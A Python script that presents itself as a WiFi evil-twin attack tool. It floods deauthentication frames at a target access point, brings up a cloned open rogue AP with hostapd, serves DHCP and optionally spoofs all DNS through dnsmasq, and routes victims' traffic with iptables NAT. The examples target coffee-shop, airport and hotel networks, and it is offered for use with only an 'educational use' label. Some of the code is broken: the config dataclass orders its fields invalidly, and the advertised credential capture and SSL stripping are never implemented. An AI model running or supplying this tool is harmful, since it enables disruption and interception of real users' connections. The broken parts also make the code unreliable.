#!/usr/bin/env python3
"""
WiFi Evil Twin Attack - Python 3.11+
====================================

Creates a rogue access point that mimics a legitimate network to perform
man-in-the-middle attacks and capture credentials.

Attack Mechanism:
-----------------
1. Deauthenticates clients from legitimate AP
2. Creates identical fake AP with same SSID
3. Clients automatically reconnect to fake AP
4. Captures credentials, cookies, or performs traffic manipulation

Technical Details:
------------------
- Uses hostapd for AP functionality
- dnsmasq for DHCP/DNS services
- iptables for traffic routing/manipulation
- Optional SSL stripping and credential capture

Components:
-----------
- Rogue AP (hostapd)
- DHCP server (dnsmasq)
- DNS spoofing
- Traffic interception
- Deauth attack against legitimate AP

Requirements:
-------------
- Monitor mode capable wireless interface
- hostapd, dnsmasq installed
- Root/sudo privileges
- Internet connection for upstream routing (optional)

Usage:
------
    # Basic evil twin
    sudo python3 evil_twin.py -i wlan0 --target-ssid "CoffeeShop_WiFi"

    # With deauth to force reconnection
    sudo python3 evil_twin.py -i wlan0 --target-ssid "CoffeeShop_WiFi" \\
        --target-bssid 00:11:22:33:44:55 --deauth

    # With credential capture
    sudo python3 evil_twin.py -i wlan0 --target-ssid "Airport_WiFi" \\
        --capture-portal --deauth

Author: Wireless Security Research
License: Educational Use Only
Python Version: 3.11+
"""

import sys
import os
import time
import signal
import subprocess
import argparse
import tempfile
import shutil
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
import threading

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth,
        sendp, conf, get_if_raw_hwaddr
    )
except ImportError:
    print("[!] Error: scapy not installed")
    print("    Install: pip3 install scapy>=2.5.0")
    sys.exit(1)

# Suppress scapy warnings
conf.verb = 0


# ============================================================================
# Configuration
# ============================================================================

@dataclass
class EvilTwinConfig:
    """Evil Twin attack configuration"""
    # Interfaces
    wireless_interface: str
    internet_interface: str | None = None

    # Target AP
    target_ssid: str
    target_bssid: str | None = None
    target_channel: int = 6

    # Rogue AP settings
    rogue_ssid: str | None = None  # If None, uses target_ssid
    rogue_bssid: str | None = None  # If None, uses interface MAC
    rogue_channel: int | None = None  # If None, uses target_channel

    # Attack options
    enable_deauth: bool = False
    deauth_count: int | None = None  # None = continuous
    deauth_rate: float = 10.0

    # Capture options
    enable_capture_portal: bool = False
    portal_template: str = "default"
    capture_file: Path = Path("./evil_twin_captures.log")

    # Network configuration
    ip_range: str = "192.168.100.0/24"
    gateway_ip: str = "192.168.100.1"
    dhcp_range_start: str = "192.168.100.10"
    dhcp_range_end: str = "192.168.100.100"

    # Traffic manipulation
    enable_ssl_strip: bool = False
    enable_dns_spoof: bool = False
    dns_spoof_target: str | None = None

    # Logging
    log_file: Path = Path("./evil_twin.log")
    verbose: bool = True

    def validate(self):
        """Validate configuration with exception groups"""
        errors = []

        if not self.wireless_interface:
            errors.append(ValueError("Wireless interface required"))

        if not self.target_ssid:
            errors.append(ValueError("Target SSID required"))

        if self.target_channel < 1 or self.target_channel > 14:
            errors.append(ValueError(f"Invalid channel: {self.target_channel}"))

        if self.enable_deauth and not self.target_bssid:
            errors.append(ValueError("Deauth requires target BSSID"))

        if self.enable_dns_spoof and not self.dns_spoof_target:
            errors.append(ValueError("DNS spoof requires target IP"))

        if errors:
            raise ExceptionGroup("Configuration validation failed", errors)


# ============================================================================
# Statistics
# ============================================================================

@dataclass
class AttackStatistics:
    """Real-time attack statistics"""
    start_time: float = field(default_factory=time.time)
    clients_connected: int = 0
    deauth_sent: int = 0
    credentials_captured: int = 0
    dns_requests: int = 0
    http_requests: int = 0
    running: bool = True

    def get_elapsed_time(self) -> float:
        return time.time() - self.start_time


# ============================================================================
# Deauth Attack Thread
# ============================================================================

class DeauthAttacker(threading.Thread):
    """Continuous deauth attack against legitimate AP"""

    def __init__(self, config: EvilTwinConfig, stats: AttackStatistics):
        super().__init__(daemon=True)
        self.config = config
        self.stats = stats
        self.running = True

    def craft_deauth_packet(self, client_mac: str = "ff:ff:ff:ff:ff:ff") -> bytes:
        """Craft deauthentication frame"""
        dot11 = Dot11(
            addr1=client_mac,  # Destination (client or broadcast)
            addr2=self.config.target_bssid,  # Source (AP)
            addr3=self.config.target_bssid   # BSSID
        )
        deauth = Dot11Deauth(reason=7)  # Class 3 frame from nonassociated STA
        packet = RadioTap() / dot11 / deauth
        return bytes(packet)

    def run(self):
        """Execute continuous deauth attack"""
        if not self.config.enable_deauth:
            return

        print("[*] Starting deauth attack thread...")
        packet_delay = 1.0 / self.config.deauth_rate
        sent_count = 0

        try:
            while self.running and self.stats.running:
                # Send to broadcast (all clients)
                packet = self.craft_deauth_packet()
                sendp(packet, iface=self.config.wireless_interface, verbose=False)

                sent_count += 1
                self.stats.deauth_sent = sent_count

                # Check count limit
                if self.config.deauth_count and sent_count >= self.config.deauth_count:
                    break

                time.sleep(packet_delay)

        except Exception as e:
            print(f"[!] Deauth thread error: {e}")

    def stop(self):
        """Stop deauth attack"""
        self.running = False


# ============================================================================
# Hostapd Manager
# ============================================================================

class HostapdManager:
    """Manages hostapd (access point) process"""

    def __init__(self, config: EvilTwinConfig):
        self.config = config
        self.process: Optional[subprocess.Popen] = None
        self.config_file: Optional[Path] = None

    def generate_hostapd_config(self) -> Path:
        """Generate hostapd configuration file"""
        config_content = f"""
# Evil Twin AP Configuration
interface={self.config.wireless_interface}
driver=nl80211
ssid={self.config.rogue_ssid or self.config.target_ssid}
hw_mode=g
channel={self.config.rogue_channel or self.config.target_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""

        # Use temporary file
        fd, path = tempfile.mkstemp(suffix='.conf', prefix='hostapd_')
        os.close(fd)

        with open(path, 'w') as f:
            f.write(config_content)

        self.config_file = Path(path)
        return self.config_file

    def start(self):
        """Start hostapd"""
        if not self.config_file:
            self.generate_hostapd_config()

        print(f"[+] Starting rogue AP: {self.config.rogue_ssid or self.config.target_ssid}")
        print(f"    Channel: {self.config.rogue_channel or self.config.target_channel}")

        try:
            self.process = subprocess.Popen(
                ['hostapd', str(self.config_file)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # Wait a moment for hostapd to initialize
            time.sleep(2)

            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                raise RuntimeError(f"hostapd failed to start: {stderr.decode()}")

            print("[+] Rogue AP started successfully")

        except FileNotFoundError:
            raise RuntimeError("hostapd not found. Install: sudo apt-get install hostapd")
        except Exception as e:
            raise RuntimeError(f"Failed to start hostapd: {e}")

    def stop(self):
        """Stop hostapd"""
        if self.process:
            print("[*] Stopping rogue AP...")
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.process.wait()

        # Clean up config file
        if self.config_file and self.config_file.exists():
            self.config_file.unlink()


# ============================================================================
# Dnsmasq Manager
# ============================================================================

class DnsmasqManager:
    """Manages dnsmasq (DHCP/DNS) process"""

    def __init__(self, config: EvilTwinConfig):
        self.config = config
        self.process: Optional[subprocess.Popen] = None
        self.config_file: Optional[Path] = None

    def generate_dnsmasq_config(self) -> Path:
        """Generate dnsmasq configuration"""
        config_content = f"""
# Evil Twin DHCP/DNS Configuration
interface={self.config.wireless_interface}
dhcp-range={self.config.dhcp_range_start},{self.config.dhcp_range_end},12h
dhcp-option=3,{self.config.gateway_ip}
dhcp-option=6,{self.config.gateway_ip}
server=8.8.8.8
log-queries
log-dhcp
bind-interfaces
"""

        if self.config.enable_dns_spoof and self.config.dns_spoof_target:
            # Spoof all domains to target IP
            config_content += f"\naddress=/#/{self.config.dns_spoof_target}\n"

        fd, path = tempfile.mkstemp(suffix='.conf', prefix='dnsmasq_')
        os.close(fd)

        with open(path, 'w') as f:
            f.write(config_content)

        self.config_file = Path(path)
        return self.config_file

    def configure_interface(self):
        """Configure network interface"""
        print(f"[+] Configuring interface {self.config.wireless_interface}")

        # Bring interface up
        subprocess.run(['ip', 'link', 'set', self.config.wireless_interface, 'up'], check=True)

        # Assign IP address
        subprocess.run([
            'ip', 'addr', 'add',
            f'{self.config.gateway_ip}/24',
            'dev', self.config.wireless_interface
        ], check=False)  # Don't fail if already assigned

    def start(self):
        """Start dnsmasq"""
        if not self.config_file:
            self.generate_dnsmasq_config()

        self.configure_interface()

        print("[+] Starting DHCP/DNS server...")

        try:
            self.process = subprocess.Popen(
                ['dnsmasq', '-C', str(self.config_file), '-d'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            time.sleep(1)

            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                raise RuntimeError(f"dnsmasq failed: {stderr.decode()}")

            print("[+] DHCP/DNS server started")

        except FileNotFoundError:
            raise RuntimeError("dnsmasq not found. Install: sudo apt-get install dnsmasq")
        except Exception as e:
            raise RuntimeError(f"Failed to start dnsmasq: {e}")

    def stop(self):
        """Stop dnsmasq"""
        if self.process:
            print("[*] Stopping DHCP/DNS server...")
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.process.wait()

        # Clean up config file
        if self.config_file and self.config_file.exists():
            self.config_file.unlink()


# ============================================================================
# Traffic Router
# ============================================================================

class TrafficRouter:
    """Manages iptables rules for traffic routing"""

    def __init__(self, config: EvilTwinConfig):
        self.config = config
        self.rules_applied = False

    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        print("[+] Enabling IP forwarding...")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')

    def setup_nat(self):
        """Setup NAT for internet access"""
        if not self.config.internet_interface:
            return

        print(f"[+] Setting up NAT ({self.config.wireless_interface} -> {self.config.internet_interface})")

        # Flush existing rules
        subprocess.run(['iptables', '-F'], check=False)
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)

        # Setup NAT
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'POSTROUTING',
            '-o', self.config.internet_interface,
            '-j', 'MASQUERADE'
        ], check=True)

        subprocess.run([
            'iptables', '-A', 'FORWARD',
            '-i', self.config.internet_interface,
            '-o', self.config.wireless_interface,
            '-m', 'state', '--state', 'RELATED,ESTABLISHED',
            '-j', 'ACCEPT'
        ], check=True)

        subprocess.run([
            'iptables', '-A', 'FORWARD',
            '-i', self.config.wireless_interface,
            '-o', self.config.internet_interface,
            '-j', 'ACCEPT'
        ], check=True)

        self.rules_applied = True
        print("[+] NAT configured")

    def cleanup(self):
        """Remove iptables rules"""
        if self.rules_applied:
            print("[*] Cleaning up iptables rules...")
            subprocess.run(['iptables', '-F'], check=False)
            subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)


# ============================================================================
# Main Evil Twin Attack
# ============================================================================

class EvilTwinAttack:
    """Main Evil Twin attack orchestrator"""

    def __init__(self, config: EvilTwinConfig):
        self.config = config
        self.config.validate()

        self.stats = AttackStatistics()
        self.hostapd = HostapdManager(config)
        self.dnsmasq = DnsmasqManager(config)
        self.router = TrafficRouter(config)
        self.deauth_thread: Optional[DeauthAttacker] = None

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle termination signals"""
        print("\n[!] Received signal, stopping attack...")
        self.stats.running = False

    def _print_banner(self):
        """Print attack banner"""
        print("=" * 70)
        print("  WiFi Evil Twin Attack")
        print("=" * 70)
        print(f"Target SSID:         {self.config.target_ssid}")
        print(f"Target BSSID:        {self.config.target_bssid or 'Not specified'}")
        print(f"Target Channel:      {self.config.target_channel}")
        print(f"Rogue SSID:          {self.config.rogue_ssid or self.config.target_ssid}")
        print(f"Rogue Channel:       {self.config.rogue_channel or self.config.target_channel}")
        print(f"Deauth Enabled:      {self.config.enable_deauth}")
        if self.config.internet_interface:
            print(f"Internet Interface:  {self.config.internet_interface}")
        print("=" * 70)
        print()

    def _print_stats(self):
        """Print attack statistics"""
        elapsed = self.stats.get_elapsed_time()
        print(f"\r[*] Clients: {self.stats.clients_connected} | "
              f"Deauth: {self.stats.deauth_sent} | "
              f"Credentials: {self.stats.credentials_captured} | "
              f"Time: {elapsed:.1f}s", end='', flush=True)

    def run(self):
        """Execute evil twin attack"""
        self._print_banner()

        print("[+] Starting Evil Twin attack...")
        print("[!] Press Ctrl+C to stop\n")

        try:
            # Step 1: Configure networking
            self.router.enable_ip_forwarding()
            if self.config.internet_interface:
                self.router.setup_nat()

            # Step 2: Start DHCP/DNS server
            self.dnsmasq.start()

            # Step 3: Start rogue AP
            self.hostapd.start()

            # Step 4: Start deauth attack if enabled
            if self.config.enable_deauth:
                self.deauth_thread = DeauthAttacker(self.config, self.stats)
                self.deauth_thread.start()

            print("\n[+] Evil Twin attack is running!")
            print("[*] Monitoring for connections...")

            # Main monitoring loop
            while self.stats.running:
                self._print_stats()
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup all resources"""
        print("\n\n[*] Cleaning up...")

        # Stop deauth thread
        if self.deauth_thread:
            self.deauth_thread.stop()
            self.deauth_thread.join(timeout=2)

        # Stop services
        self.hostapd.stop()
        self.dnsmasq.stop()
        self.router.cleanup()

        print("[+] Cleanup complete")

        # Print final stats
        print("\n" + "=" * 70)
        print("  Attack Complete - Final Statistics")
        print("=" * 70)
        print(f"Total Clients Connected:     {self.stats.clients_connected}")
        print(f"Deauth Packets Sent:         {self.stats.deauth_sent}")
        print(f"Credentials Captured:        {self.stats.credentials_captured}")
        print(f"Duration:                    {self.stats.get_elapsed_time():.2f}s")
        print("=" * 70)


# ============================================================================
# CLI
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="WiFi Evil Twin Attack (Python 3.11+)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic evil twin
  sudo python3 evil_twin.py -i wlan0 --target-ssid "CoffeeShop"

  # With deauth attack
  sudo python3 evil_twin.py -i wlan0 --target-ssid "Airport_WiFi" \\
      --target-bssid 00:11:22:33:44:55 --deauth

  # With internet access
  sudo python3 evil_twin.py -i wlan0 -I eth0 --target-ssid "Hotel_Guest" --deauth

  # With DNS spoofing
  sudo python3 evil_twin.py -i wlan0 --target-ssid "Conference" \\
      --dns-spoof --dns-target 192.168.100.1

Requirements:
  - Monitor mode capable interface
  - hostapd and dnsmasq installed
  - Root privileges

Educational Use Only - Requires proper authorization
        """
    )

    # Required arguments
    parser.add_argument('-i', '--interface', required=True,
                       help='Wireless interface (e.g., wlan0)')
    parser.add_argument('--target-ssid', required=True,
                       help='Target network SSID to impersonate')

    # Target AP
    parser.add_argument('--target-bssid',
                       help='Target AP BSSID (required for deauth)')
    parser.add_argument('--target-channel', type=int, default=6,
                       help='Target AP channel (default: 6)')

    # Rogue AP
    parser.add_argument('--rogue-ssid',
                       help='Rogue AP SSID (default: same as target)')
    parser.add_argument('--rogue-channel', type=int,
                       help='Rogue AP channel (default: same as target)')

    # Internet
    parser.add_argument('-I', '--internet-interface',
                       help='Internet interface for NAT (e.g., eth0)')

    # Attack options
    parser.add_argument('--deauth', action='store_true',
                       help='Enable deauth attack against target AP')
    parser.add_argument('--deauth-count', type=int,
                       help='Number of deauth packets (default: continuous)')
    parser.add_argument('--deauth-rate', type=float, default=10.0,
                       help='Deauth packets per second (default: 10)')

    # Capture options
    parser.add_argument('--capture-portal', action='store_true',
                       help='Enable captive portal for credential capture')
    parser.add_argument('--capture-file', default='./evil_twin_captures.log',
                       help='Capture log file (default: ./evil_twin_captures.log)')

    # Traffic manipulation
    parser.add_argument('--ssl-strip', action='store_true',
                       help='Enable SSL stripping')
    parser.add_argument('--dns-spoof', action='store_true',
                       help='Enable DNS spoofing')
    parser.add_argument('--dns-target',
                       help='DNS spoof target IP')

    # Network configuration
    parser.add_argument('--gateway-ip', default='192.168.100.1',
                       help='Gateway IP address (default: 192.168.100.1)')
    parser.add_argument('--dhcp-start', default='192.168.100.10',
                       help='DHCP range start (default: 192.168.100.10)')
    parser.add_argument('--dhcp-end', default='192.168.100.100',
                       help='DHCP range end (default: 192.168.100.100)')

    # Logging
    parser.add_argument('--log-file', default='./evil_twin.log',
                       help='Log file path (default: ./evil_twin.log)')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose logging')

    return parser.parse_args()


def main() -> int:
    """Main entry point"""
    args = parse_arguments()

    # Check root privileges
    if os.geteuid() != 0:
        print("[!] Error: This script requires root privileges")
        print("    Run with: sudo python3 evil_twin.py ...")
        return 1

    # Build configuration
    config = EvilTwinConfig(
        wireless_interface=args.interface,
        internet_interface=args.internet_interface,
        target_ssid=args.target_ssid,
        target_bssid=args.target_bssid,
        target_channel=args.target_channel,
        rogue_ssid=args.rogue_ssid,
        rogue_channel=args.rogue_channel,
        enable_deauth=args.deauth,
        deauth_count=args.deauth_count,
        deauth_rate=args.deauth_rate,
        enable_capture_portal=args.capture_portal,
        capture_file=Path(args.capture_file),
        enable_ssl_strip=args.ssl_strip,
        enable_dns_spoof=args.dns_spoof,
        dns_spoof_target=args.dns_target,
        gateway_ip=args.gateway_ip,
        dhcp_range_start=args.dhcp_start,
        dhcp_range_end=args.dhcp_end,
        log_file=Path(args.log_file),
        verbose=args.verbose
    )

    # Run attack
    attack = EvilTwinAttack(config)
    attack.run()

    return 0


if __name__ == '__main__':
    sys.exit(main())
